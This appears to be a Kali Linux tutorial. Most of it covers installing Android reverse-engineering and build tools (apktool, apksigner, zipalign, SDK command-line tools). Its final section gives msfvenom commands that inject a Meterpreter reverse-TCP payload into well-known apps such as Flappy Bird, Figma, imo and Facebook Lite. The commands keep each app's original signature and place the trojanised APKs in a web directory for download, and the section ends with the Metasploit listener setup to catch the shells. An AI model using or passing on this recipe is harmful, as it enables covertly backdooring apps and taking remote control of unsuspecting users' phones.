
## APKTool:

APKTool is a powerful tool used for **reverse engineering** Android APK files. Here's how you can install and set it up on Kali Linux:


### Download the Wrapper Script and APKTool:

```
wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
```


```
wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.7.0.jar

or,

wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar
```



#### Set Execute Permissions: 

```
chmod +x apktool

mv apktool_2.9.3.jar apktool.jar

cp apktool /usr/local/bin/
cp apktool.jar /usr/local/bin/
```


```
ll /usr/local/bin/apk*
```


_Verify `apktool`:_

```
apktool --version

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
2.9.3
```




```
which apktool
```



#### Add to Environment PATH :


```
vim ~/.bashrc


export PATH=$PATH:/usr/local/bin/apktool
```


```
source ~/.bashrc
```



---
---



### Install apksigner:

`apksigner` is a tool provided by the Android SDK to sign APK files. Signing is essential for installing APKs on devices, as it verifies their authenticity.


```
apt install apksigner
```


```
apt remove apksigner
```


```
which apksigner

/usr/bin/apksigner
```


```
chmod +x /usr/bin/apksigner
```


_Verify `apksigner`:_

```
apksigner --version


Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
0.9
```


#### Add to Environment PATH :


```
nano ~/.bashrc


export PATH=$PATH:/usr/bin/apksigner
```


```
source ~/.bashrc
```



---
---



### Install zipalign:

`zipalign` is another essential tool from the Android SDK used for optimizing APK files to ensure proper alignment. Properly aligned APKs improve runtime performance on Android devices.


#### Method-1:

```
apt install zipalign 
```


```
apt remove zipalign -y
```



#### Method-2:

```
https://debian.pkgs.org/10/debian-main-amd64/zipalign_8.1.0+r23-2_amd64.deb.html

https://ftp.debian.org/debian/pool/main/a/android-platform-build/zipalign_8.1.0+r23-2_amd64.deb

http://archive.ubuntu.com/ubuntu/pool/universe/a/android-platform-build/zipalign_8.1.0+r23-3ubuntu2_amd64.deb
```


```
dpkg -i zipalign_xxxxxx.deb
```



#### Method-3: Install Build Tools Using SDK Manager: (with `apksigner` and `zipalign`)


```
apt list --installed | grep apksigner
apt list --installed | grep zipalign
```


```
apt install openjdk-17-jdk -y
```


```
update-alternatives --config java
```


```
java -version
```



_Download the Android Command Line Tools:_

```
wget https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
```



```
unzip commandlinetools-linux-11076708_latest.zip
```


```
ll cmdline-tools

drwxr-xr-x  2 root root   4096 Jan  8 01:09 bin
drwxr-xr-x 17 root root   4096 Jan  8 01:09 lib
-rwxr-xr-x  1 root root 120464 Jan  1  2010 NOTICE.txt
-rwxr-xr-x  1 root root     86 Jan  1  2010 source.properties
```


```
mkdir -p /usr/local/android-sdk/cmdline-tools
mkdir -p /usr/local/android-sdk/cmdline-tools/latest

cp -r cmdline-tools/* /usr/local/android-sdk/cmdline-tools/latest
```



```
ll /usr/local/android-sdk/cmdline-tools/latest

drwxr-xr-x  2 root root   4096 Jan  8 01:13 bin
drwxr-xr-x 17 root root   4096 Jan  8 01:13 lib
-rwxr-xr-x  1 root root 120464 Jan  8 01:13 NOTICE.txt
-rwxr-xr-x  1 root root     86 Jan  8 01:13 source.properties
```


```
nano /etc/profile.d/android-sdk.sh

export ANDROID_HOME=/usr/local/android-sdk

export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin
export PATH=$PATH:$ANDROID_HOME/platform-tools
export PATH=$PATH:$ANDROID_HOME/build-tools
```


```
source /etc/profile.d/android-sdk.sh

echo $ANDROID_HOME 
```



```
sdkmanager --version


Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
12.0
```



_Accept Licenses: (Optional)_

```
yes | sdkmanager --licenses
```



_Replace 33.0.2 with the latest version:_

```
sdkmanager --install "build-tools;33.0.2"

sdkmanager --uninstall "build-tools;33.0.2"
```



```
ll $ANDROID_HOME/platform-tools
```


```
ll $ANDROID_HOME/build-tools

drwxr-xr-x 3 root root 4096 Jan  8 01:50 33.0.2
```


```
ll /usr/local/android-sdk/build-tools/33.0.2


-rwxr-xr-x 1 root root 1582936 Jan  8 01:51 aapt
-rwxr-xr-x 1 root root 6091120 Jan  8 01:51 aapt2
-rw-r--r-- 1 root root     343 Jan  8 01:51 aarch64-linux-android-ld
-rwxr-xr-x 1 root root 5300752 Jan  8 01:51 aidl
-rwxr-xr-x 1 root root    2959 Jan  8 01:51 apksigner
-rw-r--r-- 1 root root     343 Jan  8 01:51 arm-linux-androideabi-ld
-rwxr-xr-x 1 root root   38984 Jan  8 01:51 bcc_compat
-rw-r--r-- 1 root root   15149 Jan  8 01:51 core-lambda-stubs.jar
-rwxr-xr-x 1 root root    2598 Jan  8 01:51 d8
-rwxr-xr-x 1 root root 1019840 Jan  8 01:51 dexdump
-rw-r--r-- 1 root root     343 Jan  8 01:51 i686-linux-android-ld
drwxr-xr-x 2 root root    4096 Jan  8 01:51 lib
drwxr-xr-x 2 root root    4096 Jan  8 01:51 lib64
-rwxr-xr-x 1 root root     647 Jan  8 01:51 lld
drwxr-xr-x 2 root root    4096 Jan  8 01:51 lld-bin
-rwxr-xr-x 1 root root 1091848 Jan  8 01:51 llvm-rs-cc
-rw-r--r-- 1 root root     343 Jan  8 01:51 mipsel-linux-android-ld
-rw-r--r-- 1 root root 1021529 Jan  8 01:51 NOTICE.txt
-rw-r--r-- 1 root root   18343 Jan  8 01:51 package.xml
drwxr-xr-x 5 root root    4096 Jan  8 01:51 renderscript
-rw-r--r-- 1 root root      17 Jan  8 01:51 runtime.properties
-rw-r--r-- 1 root root      63 Jan  8 01:51 source.properties
-rwxr-xr-x 1 root root 1543744 Jan  8 01:51 split-select
-rw-r--r-- 1 root root     343 Jan  8 01:51 x86_64-linux-android-ld
-rwxr-xr-x 1 root root  263384 Jan  8 01:51 zipalign
```




#### Add `zipalign` and `apksigner` to PATH:

```
nano /etc/profile.d/zipalign.sh

export PATH=$PATH:/usr/local/android-sdk/build-tools/33.0.2
```


```
source /etc/profile.d/zipalign.sh
```




_Verify zipalign:_

```
zipalign -v
```


```
/usr/local/android-sdk/build-tools/33.0.2/zipalign
```


```
ldd $(which zipalign)
```



```
apksigner --version


Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
0.9
```



---
---




### Android Meterpreter Payload:

- `-o` , `--out` : Save the payload to a file
- `-x` , `--template` : Specify a custom executable file to use as a template (Specifies the template APK like `file_name.apk`)
- `-k` , `--keep` : Preserve the `--template` behaviour and inject the payload as a new thread (Keep the original signature of the `file_name.apk` file.)


```
msfconsole -q
```


_To automate the process or manually inject the payload using `apktool`:_

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.193 LPORT=8884 -x flappy-bird-1-3.apk -k -o /var/www/html/flappybird-inject.apk

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.193 LPORT=8885 -x figma.apk -k -o /var/www/html/figma-inject.apk

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.193 LPORT=8886 -x imo.apk -k -o /var/www/html/imo-inject.apk
```


```
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.193 LPORT=8887 -x fb-lite.apk -k -o /var/www/html/fb-inject.apk
```


#### Start the Metasploit Listener:

```
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp

set LHOST 192.168.10.193
set LPORT 8884

show options


exploit
run
```




### Links:
- [Apktool Install Guide](https://apktool.org/docs/install)
- [Apktools scripts](https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool)
- [Apktools scripts | github.com](https://github.com/iBotPeaches/Apktool/blob/master/scripts/linux/apktool)
- [Apktool Downloads | bitbucket.org](https://bitbucket.org/iBotPeaches/apktool/downloads/)
- [Apktool Tools install | video](https://www.youtube.com/watch?v=J326GXUFaz0)






